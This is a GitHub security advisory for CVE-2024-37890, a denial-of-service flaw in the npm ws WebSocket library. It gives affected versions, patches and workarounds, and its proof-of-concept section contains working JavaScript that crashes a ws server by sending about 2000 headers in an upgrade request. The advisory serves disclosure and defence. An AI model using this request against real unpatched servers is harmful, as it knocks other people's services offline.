# [H] ws affected by a DoS when handling a request with many HTTP headers

## Summary
Severity: High
Advisory: GHSA-3h5v-q93c-6h6q
CVE: CVE-2024-37890
CWE: CWE-476
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2024-06-17
Source: https://github.com/advisories/GHSA-3h5v-q93c-6h6q
Type: github-advisory

## Affected
- npm: `ws` — affected >=2.1.0 <5.2.4
- npm: `ws` — affected >=6.0.0 <6.2.3
- npm: `ws` — affected >=7.0.0 <7.5.10
- npm: `ws` — affected >=8.0.0 <8.17.1

## Details
### Impact

A request with a number of headers exceeding the [`server.maxHeadersCount`][] threshold could be used to crash a ws server.

### Proof of concept

```js
const http = require('http');
const WebSocket = require('ws');

const wss = new WebSocket.Server({ port: 0 }, function () {
  const chars = "!#$%&'*+-.0123456789abcdefghijklmnopqrstuvwxyz^_`|~".split('');
  const headers = {};
  let count = 0;

  for (let i = 0; i < chars.length; i++) {
    if (count === 2000) break;

    for (let j = 0; j < chars.length; j++) {
      const key = chars[i] + chars[j];
      headers[key] = 'x';

      if (++count === 2000) break;
    }
  }

  headers.Connection = 'Upgrade';
  headers.Upgrade = 'websocket';
  headers['Sec-WebSocket-Key'] = 'dGhlIHNhbXBsZSBub25jZQ==';
  headers['Sec-WebSocket-Version'] = '13';

  const request = http.request({
    headers: headers,
    host: '127.0.0.1',
    port: wss.address().port
  });

  request.end();
});
```

### Patches

The vulnerability was fixed in ws@8.17.1 (https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c) and backported to ws@7.5.10 (https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f), ws@6.2.3 (https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63), and ws@5.2.4 (https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e).

### Workarounds

In vulnerable versions of ws, the issue can be mitigated in the following ways:

1. Reduce the maximum allowed length of the request headers using the [`--max-http-header-size=size`][] and/or the [`maxHeaderSize`][] options so that no more headers than the `server.maxHeadersCount` limit can be sent.
2. Set `server.maxHeadersCount` to `0` so that no limit is applied.

### Credits

The vulnerability was reported by [Ryan LaPointe](https://github.com/rrlapointe) in https://github.com/websockets/ws/issues/2230.

### References

- https://github.com/advisories/GHSA-3h5v-q93c-6h6q
- https://www.cve.org/CVERecord?id=CVE-2024-37890
- https://github.com/websockets/ws/issues/2230
- https://github.com/websockets/ws/pull/2231

[`--max-http-header-size=size`]: https://nodejs.org/api/cli.html#--max-http-header-sizesize
[`maxHeaderSize`]: https://nodejs.org/api/http.html#httpcreateserveroptions-requestlistener
[`server.maxHeadersCount`]: https://nodejs.org/api/http.html#servermaxheaderscount

## References
- https://github.com/websockets/ws/security/advisories/GHSA-3h5v-q93c-6h6q
- https://github.com/websockets/ws/issues/2230
- https://github.com/websockets/ws/pull/2231
- https://github.com/websockets/ws/commit/22c28763234aa75a7e1b76f5c01c181260d7917f
- https://github.com/websockets/ws/commit/4abd8f6de4b0b65ef80b3ff081989479ed93377e
- https://github.com/websockets/ws/commit/e55e5106f10fcbaac37cfa89759e4cc0d073a52c
- https://github.com/websockets/ws/commit/eeb76d313e2a00dd5247ca3597bba7877d064a63
- https://github.com/websockets/ws
